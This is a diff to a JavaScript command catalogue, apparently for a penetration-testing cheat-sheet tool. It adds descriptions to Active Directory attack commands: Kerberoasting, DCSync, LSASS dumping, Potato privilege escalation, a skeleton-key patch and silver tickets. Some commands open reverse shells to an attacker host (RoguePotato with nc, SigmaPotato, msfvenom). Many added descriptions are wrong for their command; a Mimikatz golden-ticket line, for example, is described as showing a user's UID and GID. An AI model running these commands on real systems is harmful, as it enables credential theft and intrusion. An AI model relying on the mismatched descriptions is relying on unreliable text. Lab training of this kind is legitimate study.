           "label": "Use current TGT (no creds)",
-          "command": ".\\Rubeus.exe kerberoast /tgtdeleg /nowrap"
+          "command": ".\\Rubeus.exe kerberoast /tgtdeleg /nowrap",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         },
         {
           "label": "Stats only",
-          "command": ".\\Rubeus.exe kerberoast /stats"
+          "command": ".\\Rubeus.exe kerberoast /stats",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         },
         {
           "label": "Include AES accounts (mode 19700)",
-          "command": ".\\Rubeus.exe kerberoast /aes /nowrap"
+          "command": ".\\Rubeus.exe kerberoast /aes /nowrap",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         }
       ],
       "steps": [
@@ -125920,11 +126710,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Simple output",
-          "command": ".\\Rubeus.exe kerberoast /user:<user> /simple /nowrap"
+          "command": ".\\Rubeus.exe kerberoast /user:<user> /simple /nowrap",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         },
         {
           "label": "OPSEC single user",
-          "command": ".\\Rubeus.exe kerberoast /user:<user> /rc4opsec /nowrap /outfile:hash.txt"
+          "command": ".\\Rubeus.exe kerberoast /user:<user> /rc4opsec /nowrap /outfile:hash.txt",
+          "description": "Uses Rubeus to perform Kerberoasting - requests service tickets for all accounts with SPNs and outputs the hashes for offline cracking. Runs in-memory on Windows without touching disk."
         }
       ],
       "explain": "Roasts one specific SPN account (targeted or quiet Kerberoasting):\n  kerberoast               request a TGS for cracking\n  /user:<user>             only this account (e.g. after planting a fake SPN via GenericWrite)\n  /nowrap                  print the hash on one line\nGenerates a single Event 4769 instead of one per SPN, so it is far quieter than bulk roasting; crack with hashcat -m 13100."
@@ -126006,19 +126798,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Dump Tickets",
-          "command": "Rubeus.exe dump /nowrap"
+          "command": "Rubeus.exe dump /nowrap",
+          "description": "Uses Rubeus to dump all Kerberos tickets from memory. Extracts TGTs and TGSs from the current session for reuse in pass-the-ticket attacks."
         },
         {
           "label": "AskTGT (AES256)",
-          "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes_key> /nowrap"
+          "command": "Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<aes_key> /nowrap",
+          "description": "Runs a Rubeus operation for Kerberos-based attacks. Rubeus handles ticket manipulation, roasting, and Kerberos abuse from a Windows host."
         },
         {
           "label": "Inject Ticket",
-          "command": "Rubeus.exe ptt /ticket:<ticket>"
+          "command": "Rubeus.exe ptt /ticket:<ticket>",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "Sacrificial Process",
-          "command": "Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show"
+          "command": "Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" /show",
+          "description": "Uses Rubeus to create a new logon session with a sacrificial process, then injects a Kerberos ticket into it. Creates a clean session for ticket-based access without contaminating your current session."
         }
       ],
       "opsec": "loud",
@@ -126573,7 +127369,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "MANSPIDER",
-          "command": "docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <ip> -c 'passw' -u '<user>' -p '<password>'"
+          "command": "docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <ip> -c 'passw' -u '<user>' -p '<password>'",
+          "description": "Interacts with Docker for container enumeration or Docker-based privilege escalation. Docker group membership provides effective root access."
         }
       ],
       "opsec": "loud",
@@ -127300,7 +128097,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Full DCSync with ticket",
-          "command": "KRB5CCNAME=<ccache> secretsdump.py -k -no-pass -just-dc <domain>/administrator@<dc_fqdn>"
+          "command": "KRB5CCNAME=<ccache> secretsdump.py -k -no-pass -just-dc <domain>/administrator@<dc_fqdn>",
+          "description": "Uses Impacket secretsdump to extract NTDS.dit password hashes from a domain controller via DCSync (DRSUAPI). Retrieves all domain account hashes without touching the filesystem - requires DA or replication privileges."
         }
       ],
       "explain": "DCSyncs using a Kerberos ticket instead of a password/hash (for chains like PetitPotam/NoPac):\n  secretsdump.py           impacket remote secrets dumper\n  -just-dc-user <domain>/administrator   only replicate this one account's secrets\n  -k                       use Kerberos auth from the KRB5CCNAME ccache\n  -no-pass                 do not prompt for a password (the ticket authenticates)\n  \"<dc_hostname>@<dc_ip>\"  the DC to replicate from\nOutputs the target's NT hash and Kerberos keys via replication."
@@ -127673,15 +128471,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "comsvcs.dll MiniDump (LOLBAS)",
-          "command": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full"
+          "command": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\lsass.dmp full",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "nanodump (evasive)",
-          "command": "nanodump.exe --write C:\\lsass.dmp"
+          "command": "nanodump.exe --write C:\\lsass.dmp",
+          "description": "Dumps LSASS memory using nanodump, which creates a minidump with system call evasion techniques. Harder for EDR to detect than standard Mimikatz or ProcDump-based approaches."
         },
         {
           "label": "Parse offline with pypykatz",
-          "command": "pypykatz lsa minidump lsass.dmp"
+          "command": "pypykatz lsa minidump lsass.dmp",
+          "description": "Parse offline with pypykatz. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -127900,11 +128701,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Get-System via named pipe (PowerUp)",
-          "command": "Get-System -Technique NamedPipe"
+          "command": "Get-System -Technique NamedPipe",
+          "description": "Get-System via named pipe (PowerUp). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Token duplication (PowerUp)",
-          "command": "Get-System -Technique Token"
+          "command": "Get-System -Technique Token",
+          "description": "Token duplication (PowerUp). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -127993,17 +128796,20 @@ const COMMAND_DATA = {
         {
           "command": ".\\SigmaPotato.exe --revshell <lhost> <lport>",
           "caption": "SigmaPotato: modern SeImpersonate exploit, works on Server 2019/2022 and Win10/11",
-          "label": "SigmaPotato - reverse shell"
+          "label": "SigmaPotato - reverse shell",
+          "description": "SigmaPotato - reverse shell. See the command syntax for exact parameters and flags."
         },
         {
           "command": ".\\SigmaPotato.exe \"<command>\"",
           "caption": "SigmaPotato: run arbitrary command as SYSTEM",
-          "label": "SigmaPotato - run a command"
+          "label": "SigmaPotato - run a command",
+          "description": "SigmaPotato - run a command. See the command syntax for exact parameters and flags."
         },
         {
           "command": ".\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"",
           "caption": "GodPotato: alternative for latest Windows/Server (2019+)",
-          "label": ".\\GodPotato-NET4.exe"
+          "label": ".\\GodPotato-NET4.exe",
+          "description": "Exploits the GodPotato vulnerability for local privilege escalation from service accounts with SeImpersonatePrivilege. Elevates from a service context to SYSTEM."
         }
       ],
       "defense": {
@@ -128342,15 +129148,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "GodPotato (modern, works 2019/2022)",
-          "command": "GodPotato.exe -cmd \"cmd /c whoami\""
+          "command": "GodPotato.exe -cmd \"cmd /c whoami\"",
+          "description": "GodPotato (modern, works 2019/2022). See the command syntax for exact parameters and flags."
         },
         {
           "label": "RoguePotato",
-          "command": "RoguePotato.exe -r <attacker_ip> -e \"C:\\tools\\nc.exe <lhost> <lport> -e cmd\" -l 9999"
+          "command": "RoguePotato.exe -r <attacker_ip> -e \"C:\\tools\\nc.exe <lhost> <lport> -e cmd\" -l 9999",
+          "description": "Exploits RoguePotato for local privilege escalation from a service account. Uses a fake OXID resolver to trick the system into authenticating and impersonating SYSTEM."
         },
         {
           "label": "EfsPotato",
-          "command": "EfsPotato.exe \"cmd /c whoami\""
+          "command": "EfsPotato.exe \"cmd /c whoami\"",
+          "description": "Exploits EfsPotato for local privilege escalation via the Encrypting File System (EFS) service. Elevates from SeImpersonatePrivilege to SYSTEM."
         }
       ],
       "steps": [
@@ -128825,43 +129634,53 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SessionHunter against a target list",
-          "command": "Invoke-SessionHunter -NoPortScan -RawResults -Targets <hostlist> | select Hostname,UserSession,Access"
+          "command": "Invoke-SessionHunter -NoPortScan -RawResults -Targets <hostlist> | select Hostname,UserSession,Access",
+          "description": "SessionHunter against a target list - outputs Hostname, UserSession, Access."
         },
         {
           "label": "PowerHuntShares - hunt SMB shares",
-          "command": "Invoke-HuntSMBShares -NoPing -OutputDirectory <out_dir> -HostList <hostlist>"
+          "command": "Invoke-HuntSMBShares -NoPing -OutputDirectory <out_dir> -HostList <hostlist>",
+          "description": "Crawls SMB shares across the domain looking for accessible files with sensitive content. Scans for credentials in configs, scripts, and documents - outputs a structured report of findings."
         },
         {
           "label": "PowerView user-location fallback",
-          "command": "Find-DomainUserLocation -CheckAccess"
+          "command": "Find-DomainUserLocation -CheckAccess",
+          "description": "Uses PowerView to find domain user sessions and verify whether you have local admin access on those machines. Combines session hunting with access checking for actionable lateral movement targets."
         },
         {
           "label": "Check local admin on a host (multi-threaded)",
-          "command": "Invoke-CheckLocalAdminAccess"
+          "command": "Invoke-CheckLocalAdminAccess",
+          "description": "Tests whether the current user has local administrator access on target machines. Iterates through domain computers attempting to access the administrative share (ADMIN$) to verify admin rights."
         },
         {
           "label": "Find WMI local admin access",
-          "command": "Find-WMILocalAdminAccess.ps1"
+          "command": "Find-WMILocalAdminAccess.ps1",
+          "description": "Find WMI local admin access. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Enumerate a host's local Administrators group",
-          "command": "Get-NetLocalGroupMember -ComputerName <host> -GroupName Administrators"
+          "command": "Get-NetLocalGroupMember -ComputerName <host> -GroupName Administrators",
+          "description": "Enumerate a host's local Administrators group. See the command syntax for exact parameters and flags."
         },
         {
           "label": "PowerView file servers",
-          "command": "Get-DomainFileServer"
+          "command": "Get-DomainFileServer",
+          "description": "Discovers file servers in the domain by parsing user home directory and profile path attributes. Identifies file servers that likely contain sensitive data and active user sessions."
         },
         {
           "label": "PowerView DFS shares",
-          "command": "Get-DomainDFSShare"
+          "command": "Get-DomainDFSShare",
+          "description": "Enumerates DFS (Distributed File System) shares in the domain using PowerView. DFS namespaces may expose additional shares not visible through standard share enumeration."
         },
         {
           "label": "Get-NetShare (shares on a specific host)",
-          "command": "Get-NetShare -ComputerName <host>"
+          "command": "Get-NetShare -ComputerName <host>",
+          "description": "Get-NetShare (shares on a specific host). See the command syntax for exact parameters and flags."
         },
         {
           "label": "File servers (course alias of Get-DomainFileServer)",
-          "command": "Get-NetFileServer -Domain <domain>"
+          "command": "Get-NetFileServer -Domain <domain>",
+          "description": "File servers (course alias of Get-DomainFileServer). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -129301,11 +130120,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Grant yourself full control after takeown",
-          "command": "icacls '<target_file>' /grant <user>:F"
+          "command": "icacls '<target_file>' /grant <user>:F",
+          "description": "Grant yourself full control after takeown. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Recursive on a directory",
-          "command": "takeown /f '<target_dir>' /r /d y"
+          "command": "takeown /f '<target_dir>' /r /d y",
+          "description": "Takes ownership of a file or directory using the Windows takeown command. First step in gaining access to files you don't have permissions on - ownership lets you then modify the ACL."
         }
       ],
       "steps": [
@@ -129527,11 +130348,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SPNs for a specific account",
-          "command": "setspn.exe -L <domain>\\<user>"
+          "command": "setspn.exe -L <domain>\\<user>",
+          "description": "SPNs for a specific account. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Forest-wide",
-          "command": "setspn.exe -T <forest> -Q */*"
+          "command": "setspn.exe -T <forest> -Q */*",
+          "description": "Lists all Service Principal Names registered in the forest. Comprehensive SPN inventory for identifying Kerberoasting targets across all domains in the forest."
         }
       ],
       "explain": "Lists domain SPNs with the native Windows tool (living-off-the-land Kerberoasting):\n  setspn.exe -Q */*        query for all SPNs in the domain (-L <account> for one account, -T <forest> for forest-wide)\nCombined with .NET's KerberosRequestorSecurityToken (to request the ticket) and Mimikatz kerberos::list /export (to extract it), you can Kerberoast with zero third-party offensive tooling."
@@ -129732,7 +130555,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Add a Key Credential (shadow creds)",
-          "command": "pywhisker --dc-ip <dc_ip> -d <domain> -u <user> -p <password> --target <victim> --action add"
+          "command": "pywhisker --dc-ip <dc_ip> -d <domain> -u <user> -p <password> --target <victim> --action add",
+          "description": "Add a Key Credential (shadow creds). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Plants a Shadow Credential on a target to obtain a PFX you can authenticate with:\n  pywhisker                msDS-KeyCredentialLink manipulator\n  --dc-ip <dc_ip>          the Domain Controller\n  -d <domain> -u <user> -p '<password>'   authenticate as the account with write access\n  --target <target_user>   the victim whose msDS-KeyCredentialLink you write\n  --action add             add an attacker-controlled key credential\nYou get a PFX for the target; use it with gettgtpkinit (PKINIT) to authenticate as them."
@@ -130384,15 +131208,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Stealth (session loop, DC-only)",
-          "command": ".\\SharpHound.exe -c DCOnly --zipfilename bh"
+          "command": ".\\SharpHound.exe -c DCOnly --zipfilename bh",
+          "description": "Runs SharpHound collector to gather Active Directory data for BloodHound analysis. Collects user sessions, group memberships, ACLs, and trust relationships - the dataset that powers attack path analysis."
         },
         {
           "label": "Loop sessions over time",
-          "command": ".\\SharpHound.exe -c Session --loop --loopduration 02:00:00"
+          "command": ".\\SharpHound.exe -c Session --loop --loopduration 02:00:00",
+          "description": "Runs SharpHound in session collection mode only. Gathers active user sessions across the network - lighter weight and less noisy than a full collection, good for periodic session updates."
         },
         {
           "label": "ADRecon (Excel report, alt to BloodHound)",
-          "command": ".\\ADRecon.ps1 -DomainController <dc> -Credential <domain>\\<user>"
+          "command": ".\\ADRecon.ps1 -DomainController <dc> -Credential <domain>\\<user>",
+          "description": "ADRecon (Excel report, alt to BloodHound). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -130605,7 +131432,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Any PowerView function, compiled",
-          "command": ".\\SharpView.exe Get-DomainGroupMember -Identity 'Domain Admins'"
+          "command": ".\\SharpView.exe Get-DomainGroupMember -Identity 'Domain Admins'",
+          "description": "Uses PowerView to enumerate administrative and privileged groups in the domain for attack path mapping."
         }
       ],
       "explain": "Runs PowerView functionality as a compiled binary (SharpView):\n  .\\SharpView.exe Get-DomainUser   invoke a PowerView cmdlet from the .exe\n  -Identity <user>                 the same parameters PowerView uses\nRuns without a PowerShell session, dodging PowerShell/AMSI-based detection; supports the full PowerView API (Get-DomainUser -SPN, Get-DomainGroupMember -Recurse, etc.)."
@@ -130837,17 +131665,20 @@ const COMMAND_DATA = {
         {
           "command": "wine shellter.exe",
           "caption": "Run shellter via wine on Kali Linux",
-          "label": "Run under wine"
+          "label": "Run under wine",
+          "description": "Runs a Windows executable on Linux using Wine. Allows using Windows-only tools (like SharpHound or Rubeus) from a Linux attack host without a Windows VM."
         },
         {
           "command": "# Manual mode: M\n# Allows custom shellcode injection (paste hex shellcode from msfvenom -f hex)",
           "caption": "Manual mode for custom msfvenom shellcode",
-          "label": "Manual mode: M # Allows custom she…"
+          "label": "Manual mode: M # Allows custom she…",
+          "description": "Generates a custom payload with msfvenom for use in exploitation. Output format and encoding can be adjusted for the target platform and evasion needs."
         },
         {
           "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o payload.raw\n# Then in shellter Manual mode, load payload.raw",
           "caption": "Generate raw payload for shellter manual mode",
-          "label": "msfvenom"
+          "label": "msfvenom",
+          "description": "Generates a Windows reverse shell payload with msfvenom. Creates an executable or shellcode that connects back to your listener when run on the target."
         }
       ],
       "examples": [
@@ -131818,15 +132649,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "CIFS service (file access)",
-          "command": "Rubeus.exe silver /service:cifs/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
+          "command": "Rubeus.exe silver /service:cifs/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "HOST service (schtasks/wmi)",
-          "command": "Rubeus.exe silver /service:host/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt"
+          "command": "Rubeus.exe silver /service:host/<host_fqdn> /rc4:<machine_hash> /sid:<domain_sid> /user:Administrator /domain:<domain> /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         },
         {
           "label": "Mimikatz",
-          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<host_fqdn> /service:cifs /rc4:<machine_hash> /ptt"
+          "command": "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<host_fqdn> /service:cifs /rc4:<machine_hash> /ptt",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Forges a Silver Ticket - a TGS for one service, signed with that service account's hash - bypassing the KDC entirely (quieter than golden):\n  silver                    forge a service ticket offline\n  /service:<spn>           the target SPN (e.g. cifs/<host> for file access)\n  /rc4:<nt_hash>           the service/machine account's NTLM hash\n  /sid:<domain_sid>        the domain SID\n  /user:Administrator      the user to impersonate to that service\n  /domain:<domain> /ptt    the domain, and inject the ticket\nNo AS/TGS request ever reaches a DC, so there is no 4768/4769 to correlate; access is limited to that one service."
@@ -132052,15 +132886,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SafetyKatz (CRTP lab tool)",
-          "command": "SafetyKatz.exe '\"privilege::debug\" \"misc::skeleton\"' \"<dc_fqdn>\""
+          "command": "SafetyKatz.exe '\"privilege::debug\" \"misc::skeleton\"' \"<dc_fqdn>\"",
+          "description": "Enables SeDebugPrivilege in the current process. Required before most Mimikatz credential-dumping operations as it grants access to other processes' memory (LSASS)."
         },
         {
           "label": "LSASS PPL bypass via mimidriv.sys (kernel driver)",
-          "command": "mimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton\nmimikatz # !-"
+          "command": "mimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton\nmimikatz # !-",
+          "description": "Enables SeDebugPrivilege in the current process. Required before most Mimikatz credential-dumping operations as it grants access to other processes' memory (LSASS)."
         },
         {
           "label": "Then auth with the master password 'mimikatz'",
-          "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz"
+          "command": "Enter-PSSession -ComputerName <host> -Credential <domain>\\<user>\n# Password: mimikatz",
+          "description": "Opens an interactive PowerShell Remoting session to a remote machine. Provides a live shell on the target through WinRM - similar to SSH for Windows environments."
         }
       ],
       "explain": "Patches LSASS on a DC to add a master password that authenticates as ANY account alongside its real one:\n  Invoke-Mimikatz          run Mimikatz remotely\n  -Command '\"misc::skeleton\"'   inject the skeleton key into lsass on the DC\n  -ComputerName <dc_host>  the Domain Controller to patch (needs DA + code exec on the DC)\nAfterwards any user logs on with the password 'mimikatz' (or their own). It lives only in memory, so it does NOT survive a DC reboot - re-inject as needed."
@@ -132464,11 +133301,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Windows CMD",
-          "command": "net use n: \\\\<ip>\\<share> /user:<user> <password>\ndir n:\\*cred* /s /b\nfindstr /s /i cred n:\\*.*"
+          "command": "net use n: \\\\<ip>\\<share> /user:<user> <password>\ndir n:\\*cred* /s /b\nfindstr /s /i cred n:\\*.*",
+          "description": "Mounts a remote SMB share using net use and searches it for files containing credentials. Combines share mapping with recursive filename and content searching."
         },
         {
           "label": "Windows PowerShell",
-          "command": "$username = '<user>'\n$password = '<password>'\n$secpassword = ConvertTo-SecureString $password -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nNew-PSDrive -Name 'N' -Root '\\\\<ip>\\<share>' -PSProvider 'FileSystem' -Credential $cred\nGet-ChildItem -Recurse -Path N:\\ -Include *cred* -File\nGet-ChildItem -Recurse -Path N:\\ | Select-String 'cred' -List"
+          "command": "$username = '<user>'\n$password = '<password>'\n$secpassword = ConvertTo-SecureString $password -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword\nNew-PSDrive -Name 'N' -Root '\\\\<ip>\\<share>' -PSProvider 'FileSystem' -Credential $cred\nGet-ChildItem -Recurse -Path N:\\ -Include *cred* -File\nGet-ChildItem -Recurse -Path N:\\ | Select-String 'cred' -List",
+          "description": "Reference table of hashcat mode numbers for Windows and Active Directory hash types. Covers NTLM, NetNTLMv1/v2, DCC, and Kerberos ticket formats."
         }
       ],
       "type": "command",
@@ -132650,11 +133489,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec + only show hits",
-          "command": "nxc smb <ip> -u <userlist> -p '<password>' --continue-on-success | grep +"
+          "command": "nxc smb <ip> -u <userlist> -p '<password>' --continue-on-success | grep +",
+          "description": "Uses CrackMapExec for password spraying - testing a single password against multiple user accounts. Respects lockout policies by using one password per spray round."
         },
         {
           "label": "Pass-the-hash spray",
-          "command": "crackmapexec smb <cidr> -u administrator -H <nt_hash> --local-auth | grep +"
+          "command": "crackmapexec smb <cidr> -u administrator -H <nt_hash> --local-auth | grep +",
+          "description": "Authenticates using local (SAM) credentials instead of domain credentials. Tests whether a local admin password or hash works on target machines."
         }
       ],
       "explain": "Sprays a single password across many usernames over SMB, staying under lockout thresholds.:\n  -u <userlist>  username / user to authenticate as\n  -p <password>  password (or port, depending on context)\n  <ip>           target IP address\n  <password>     password\nSpray one password across many users over SMB (`nxc smb <dc> -u users -p 'Welcome1'`) to dodge lockout."
@@ -132859,7 +133700,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enumerate users (null session)",
-          "command": "rpcclient -U \"\" -N <ip> -c enumdomusers"
+          "command": "rpcclient -U \"\" -N <ip> -c enumdomusers",
+          "description": "Enumerate users (null session). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Enumerates a host over a null RPC session with rpcclient:\n  rpcclient -U \"\" <ip>   connect anonymously\nInteractive commands then enumerate the server (srvinfo), domains (enumdomains), shares (netshareenumall), and users (enumdomusers/queryuser); a RID-cycling for-loop recovers usernames even when direct enumeration is blocked."
@@ -132954,35 +133796,43 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Connect to a share (null session)",
-          "command": "smbclient //<ip>/notes"
+          "command": "smbclient //<ip>/notes",
+          "description": "Connect to a share (null session). See the command syntax for exact parameters and flags."
         },
         {
           "label": "List shares (authenticated)",
-          "command": "smbclient -U <user> -L //<ip>"
+          "command": "smbclient -U <user> -L //<ip>",
+          "description": "List shares (authenticated). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Connect to a share (authenticated)",
-          "command": "smbclient -U <user> //<ip>/<share>"
+          "command": "smbclient -U <user> //<ip>/<share>",
+          "description": "Connect to a share (authenticated). See the command syntax for exact parameters and flags."
         },
         {
           "label": "smbmap - share permissions",
-          "command": "smbmap -H <ip>"
+          "command": "smbmap -H <ip>",
+          "description": "Smbmap - share permissions. See the command syntax for exact parameters and flags."
         },
         {
           "label": "smbmap - authenticated",
-          "command": "smbmap -H <ip> -u <user> -p <password>"
+          "command": "smbmap -H <ip> -u <user> -p <password>",
+          "description": "Enumerates SMB shares and tests access permissions from Linux. Shows READ/WRITE permissions per share for the authenticated user."
         },
         {
           "label": "crackmapexec - shares (null)",
-          "command": "crackmapexec smb <ip> --shares -u '' -p ''"
+          "command": "crackmapexec smb <ip> --shares -u '' -p ''",
+          "description": "Uses CrackMapExec to enumerate accessible SMB shares on target hosts. Lists shares and your permission level (READ/WRITE) - identifies data access and potential write targets for payload deployment."
         },
         {
           "label": "crackmapexec - shares (authenticated)",
-          "command": "crackmapexec smb <ip> --shares -u <user> -p <password>"
+          "command": "crackmapexec smb <ip> --shares -u <user> -p <password>",
+          "description": "Uses CrackMapExec to enumerate accessible SMB shares on target hosts. Lists shares and your permission level (READ/WRITE) - identifies data access and potential write targets for payload deployment."
         },
         {
           "label": "Nmap SMB scan",
-          "command": "sudo nmap <ip> -sV -sC -p139,445"
+          "command": "sudo nmap <ip> -sV -sC -p139,445",
+          "description": "Runs an nmap scan with version detection, default scripts for detailed service enumeration and target analysis."
         }
       ],
       "opsec": "loud",
@@ -133156,11 +134006,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Connect as guest",
-          "command": "smbclient \\\\\\\\<ip>\\\\users"
+          "command": "smbclient \\\\\\\\<ip>\\\\users",
+          "description": "Connects to SMB shares for browsing and file transfer from Linux. Interactive shell for navigating share contents and transferring files."
         },
         {
           "label": "Connect with credentials",
-          "command": "smbclient -U bob \\\\\\\\<ip>\\\\users"
+          "command": "smbclient -U bob \\\\\\\\<ip>\\\\users",
+          "description": "Connects to SMB shares for browsing and file transfer from Linux. Interactive shell for navigating share contents and transferring files."
         }
       ],
       "opsec": "moderate",
@@ -133624,11 +134476,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Pass-the-hash",
-          "command": "smbmap -u <user> -H <nt_hash> -d <domain> -H <target>"
+          "command": "smbmap -u <user> -H <nt_hash> -d <domain> -H <target>",
+          "description": "Uses smbmap with an NTLM hash instead of a password (pass-the-hash). Enumerates share access using stolen hashes without needing the plaintext password."
         },
         {
           "label": "Run a command (if admin)",
-          "command": "smbmap -u <user> -p <password> -H <target> -x 'whoami'"
+          "command": "smbmap -u <user> -p <password> -H <target> -x 'whoami'",
+          "description": "Executes an OS command on the target via SMB through smbmap. Requires admin-level access - runs commands as the authenticated user."
         }
       ],
       "explain": "Enumerates SMB shares and your access with smbmap:\n  smbmap -u <user> -p <password>   authenticate\n  -d <domain>                      the domain\n  -H <target>                      the host to enumerate\nShows READ/WRITE per share; add -r '<share>' to list a share's contents, or use null creds (-u '' -p '') to test anonymous access - faster than manual smbclient browsing."
@@ -133706,11 +134560,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Download",
-          "command": "smbmap -H <ip> --download \"<share>\\<file>\""
+          "command": "smbmap -H <ip> --download \"<share>\\<file>\"",
+          "description": "Downloads a specific file from an SMB share. Targeted file retrieval for exfiltrating identified sensitive files."
         },
         {
           "label": "Upload",
-          "command": "smbmap -H <ip> --upload <local_file> \"<share>\\<remote_file>\""
+          "command": "smbmap -H <ip> --upload <local_file> \"<share>\\<remote_file>\"",
+          "description": "Enumerates SMB shares and tests access permissions from Linux. Shows READ/WRITE permissions per share for the authenticated user."
         }
       ],
       "opsec": "loud",
@@ -134025,7 +134881,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Search filenames for secrets",
-          "command": "smbmap -u <user> -p <password> -H <target> -R --depth 5 -A '(password|cred|\\.kdbx)'"
+          "command": "smbmap -u <user> -p <password> -H <target> -R --depth 5 -A '(password|cred|\\.kdbx)'",
+          "description": "Search filenames for secrets. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Recursively lists the contents of an SMB share with smbmap:\n  -u/-p -d <domain>       credentials and domain\n  -H <target>             the host\n  --no-write-check        skip testing write access (faster)\n  -r <share>              recurse into this share\nMaps every file in a department/IT share so you can spot configs, scripts, and backups; add -A '<regex>' to auto-download matches, or --download '<path>' for a single file."
@@ -134113,31 +134970,37 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Nmap SMTP scan",
-          "command": "sudo nmap <ip> -sC -sV -p25"
+          "command": "sudo nmap <ip> -sC -sV -p25",
+          "description": "Runs an nmap scan with version detection, default scripts for detailed service enumeration and target analysis."
         },
         {
           "label": "Nmap open-relay test",
-          "command": "sudo nmap <ip> -p25 --script smtp-open-relay -v"
+          "command": "sudo nmap <ip> -p25 --script smtp-open-relay -v",
+          "description": "Tests whether the SMTP server is an open relay using nmap scripts. Open relays can be abused to send spoofed emails for phishing."
         },
         {
           "command": "nc -nv <ip> 25",
           "caption": "Netcat banner grab on SMTP port 25",
-          "label": "nc connect"
+          "label": "nc connect",
+          "description": "Uses netcat for network connections, file transfers, or shell access. Versatile networking utility available on most Unix systems."
         },
         {
           "command": "VRFY <username>",
           "caption": "Manual VRFY: 250 = valid user, 550 = not found",
-          "label": "VRFY"
+          "label": "VRFY",
+          "description": "Verifies whether a username exists on the SMTP server. Used for email user enumeration - a valid response confirms the account exists."
         },
         {
           "command": "EXPN postmaster",
           "caption": "EXPN: expand mailing list / alias to real addresses",
-          "label": "EXPN"
+          "label": "EXPN",
+          "description": "Expands a mailing list or alias on the SMTP server. Reveals the actual email addresses behind a distribution list for user enumeration."
         },
         {
